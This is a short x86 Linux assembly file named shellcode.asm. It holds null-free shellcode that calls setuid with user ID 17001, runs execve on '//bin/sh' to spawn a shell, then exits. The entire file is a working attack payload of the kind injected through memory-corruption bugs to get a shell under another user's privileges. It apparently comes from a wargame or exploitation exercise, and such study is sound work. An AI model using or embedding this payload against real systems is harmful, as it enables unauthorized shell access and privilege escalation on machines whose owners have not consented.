;shellcode.asm
[SECTION .text]
global _start
_start:
  ; setuid
  xor eax, eax
  xor ebx, ebx
  mov bx, 17001
  mov al, 23
  int 0x80

  ; execve
  xor eax, eax
  push eax
  push 0x68732f6e
  push 0x69622f2f
  mov ebx, esp
  push eax
  mov edx, esp
  push ebx
  mov ecx, esp
  mov al, 11
  int 0x80

  ; exit
  xor eax, eax
  mov al, 1
  int 0x80
